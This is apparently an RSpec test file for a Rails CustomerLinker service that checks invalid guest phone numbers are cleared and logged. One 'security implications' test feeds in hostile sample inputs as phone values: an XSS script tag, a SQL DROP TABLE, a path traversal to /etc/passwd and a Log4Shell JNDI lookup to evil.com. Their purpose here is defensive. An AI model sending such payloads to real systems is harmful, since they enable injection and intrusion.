# frozen_string_literal: true

require 'rails_helper'

RSpec.describe CustomerLinker, type: :service do
  describe '#find_or_create_guest_customer - invalid phone handling (Bug 11)' do
    let(:business) { create(:business) }
    let(:linker) { described_class.new(business) }

    context 'creating new guest customer with invalid phone' do
      it 'clears phone field when phone has fewer than 7 digits' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '12345' # Invalid - only 5 digits
        )

        expect(customer).to be_persisted
        # Bug 11 fix: Invalid phone is cleared, not stored
        expect(customer.phone).to be_nil
        expect(customer.first_name).to eq('Guest')
        expect(customer.last_name).to eq('User')
      end

      it 'clears phone field when phone has no digits at all' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '()-' # Invalid - no digits
        )

        expect(customer).to be_persisted
        # Bug 11 fix: Invalid phone is cleared, not stored
        expect(customer.phone).to be_nil
      end

      it 'logs warning when clearing invalid phone' do
        expect(Rails.logger).to receive(:warn)
          .with(match(/Invalid phone number provided.*clearing phone field/i))

        linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '123'
        )
      end

      it 'stores valid phone numbers normally (baseline)' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '+16026866672' # Valid phone
        )

        expect(customer).to be_persisted
        expect(customer.phone).to eq('+16026866672')
      end

      it 'prevents duplicate accounts with same invalid phone (Bug 11 security fix)' do
        # Before Bug 11 fix: Both would be created with phone='123'
        # After Bug 11 fix: Both created but phone is nil (no invalid phone stored)

        guest1 = linker.find_or_create_guest_customer(
          'guest1@example.com',
          first_name: 'Guest',
          last_name: 'One',
          phone: '123' # Invalid
        )

        guest2 = linker.find_or_create_guest_customer(
          'guest2@example.com',
          first_name: 'Guest',
          last_name: 'Two',
          phone: '123' # Same invalid phone
        )

        # Both customers created (different emails)
        expect(guest1).to be_persisted
        expect(guest2).to be_persisted
        expect(guest1.id).not_to eq(guest2.id)

        # But neither has the invalid phone stored (Bug 11 fix)
        expect(guest1.phone).to be_nil
        expect(guest2.phone).to be_nil
      end

      it 'does not trigger database query for invalid phone (performance)' do
        expect(linker).not_to receive(:find_customers_by_phone)

        linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '99999' # Invalid - only 5 digits
        )
      end
    end

    context 'updating existing guest customer with invalid phone' do
      it 'clears phone when updating with invalid phone' do
        # Create guest with valid phone
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '+16026866672' # Valid
        )

        expect(customer.phone).to eq('+16026866672')

        # Update with invalid phone - should clear it
        updated = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '123' # Invalid
        )

        # Phone should be cleared (Bug 11 fix)
        expect(updated.id).to eq(customer.id)
        expect(updated.phone).to be_nil
      end

      it 'logs warning when clearing phone during update' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '+16026866672'
        )

        expect(Rails.logger).to receive(:warn)
          .with(match(/Invalid phone number provided.*clearing phone field/i))

        linker.find_or_create_guest_customer(
          'guest@example.com',
          phone: '999' # Invalid
        )
      end

      it 'does not clear phone if update does not include invalid phone' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '+16026866672'
        )

        # Update other fields without touching phone
        updated = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Updated',
          last_name: 'Name'
          # No phone attribute provided
        )

        # Phone should be unchanged
        expect(updated.phone).to eq('+16026866672')
        expect(updated.first_name).to eq('Updated')
      end

      it 'does not clear phone unnecessarily when invalid phone provided but customer has no phone' do
        # Create guest without phone
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User'
          # No phone
        )

        expect(customer.phone).to be_nil

        # Update with invalid phone - should remain nil (no update needed)
        updated = linker.find_or_create_guest_customer(
          'guest@example.com',
          phone: '123' # Invalid
        )

        # Phone still nil, no unnecessary database update
        expect(updated.phone).to be_nil
      end

      it 'successfully updates phone when valid phone provided' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '+16026866672'
        )

        # Update with different valid phone
        updated = linker.find_or_create_guest_customer(
          'guest@example.com',
          phone: '+18675309000' # Valid phone
        )

        expect(updated.phone).to eq('+18675309000')
      end
    end

    context 'edge cases' do
      it 'handles phone with only formatting characters (no digits)' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '()- -()' # Only formatting
        )

        expect(customer.phone).to be_nil
      end

      it 'handles phone with whitespace and special characters' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '   @@@   ' # Whitespace and special chars
        )

        expect(customer.phone).to be_nil
      end

      it 'handles exactly 6 digits (boundary case - invalid)' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '123456' # Exactly 6 digits - invalid
        )

        expect(customer.phone).to be_nil
      end

      it 'handles exactly 7 digits (boundary case - valid)' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '1234567' # Exactly 7 digits - valid
        )

        # 7 digits is valid - should be stored
        expect(customer.phone).to be_present
      end

      it 'handles empty string phone' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: '' # Empty string
        )

        # Empty string should not trigger validation or warning
        expect(customer.phone).to eq('')
      end

      it 'handles nil phone' do
        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          first_name: 'Guest',
          last_name: 'User',
          phone: nil
        )

        expect(customer.phone).to be_nil
      end

      it 'does not mutate the original customer_attributes hash' do
        original_attributes = {
          first_name: 'Guest',
          last_name: 'User',
          phone: '12345' # Invalid phone
        }

        # Make a copy to verify the original is not mutated
        attributes_copy = original_attributes.dup

        customer = linker.find_or_create_guest_customer(
          'guest@example.com',
          original_attributes
        )

        # Original hash should remain unchanged
        expect(original_attributes).to eq(attributes_copy)
        expect(original_attributes[:phone]).to eq('12345') # Phone should still be present in original

        # But customer should have phone cleared
        expect(customer.phone).to be_nil
      end
    end

    context 'security implications' do
      it 'prevents storing malicious input disguised as phone number' do
        malicious_inputs = [
          '<script>alert("xss")</script>',
          'DROP TABLE customers;',
          '../../etc/passwd',
          '${jndi:ldap://evil.com}'
        ]

        malicious_inputs.each do |malicious_input|
          customer = linker.find_or_create_guest_customer(
            "test#{SecureRandom.hex}@example.com",
            first_name: 'Security',
            last_name: 'Test',
            phone: malicious_input
          )

          # All should be cleared (no digits = invalid)
          expect(customer.phone).to be_nil
        end
      end

      it 'logs attempts to store invalid phones for security auditing' do
        expect(Rails.logger).to receive(:warn)
          .with(match(/Invalid phone number provided/))
          .at_least(:once)

        linker.find_or_create_guest_customer(
          'audit@example.com',
          first_name: 'Audit',
          last_name: 'Test',
          phone: 'invalid-phone-attempt'
        )
      end
    end

    context 'data integrity' do
      it 'maintains data integrity when phone validation changes' do
        # Simulate scenario where phone validation rules change
        # Old code: Stored invalid phones
        # New code (Bug 11 fix): Clears invalid phones

        customer = linker.find_or_create_guest_customer(
          'integrity@example.com',
          first_name: 'Data',
          last_name: 'Integrity',
          phone: '99999'
        )

        # Verify customer created successfully with nil phone
        expect(customer).to be_persisted
        expect(customer.phone).to be_nil
        expect(customer.first_name).to eq('Data')

        # Can still query and update this customer
        found = business.tenant_customers.find(customer.id)
        expect(found).to eq(customer)

        # Can update with valid phone
        updated = linker.find_or_create_guest_customer(
          'integrity@example.com',
          phone: '+16026866672'
        )

        expect(updated.phone).to eq('+16026866672')
      end

      it 'does not affect phone_opt_in when clearing invalid phone' do
        customer = linker.find_or_create_guest_customer(
          'optin@example.com',
          first_name: 'Opt',
          last_name: 'In',
          phone: '123', # Invalid
          phone_opt_in: true
        )

        # Phone should be cleared but opt-in preserved (for when valid phone added later)
        expect(customer.phone).to be_nil
        expect(customer.phone_opt_in).to be true
      end
    end

    context 'backward compatibility' do
      it 'handles existing customers with invalid phones in database' do
        # Manually create customer with invalid phone (legacy data)
        legacy_customer = business.tenant_customers.create!(
          email: 'legacy@example.com',
          first_name: 'Legacy',
          last_name: 'Customer',
          phone: '123', # Invalid phone that was stored before Bug 11 fix
          user_id: nil
        )

        expect(legacy_customer.phone).to eq('123')

        # Update this customer - should clear the invalid phone
        updated = linker.find_or_create_guest_customer(
          'legacy@example.com',
          phone: '456' # Still invalid
        )

        # Invalid phone should be cleared
        expect(updated.phone).to be_nil
      end
    end
  end
end
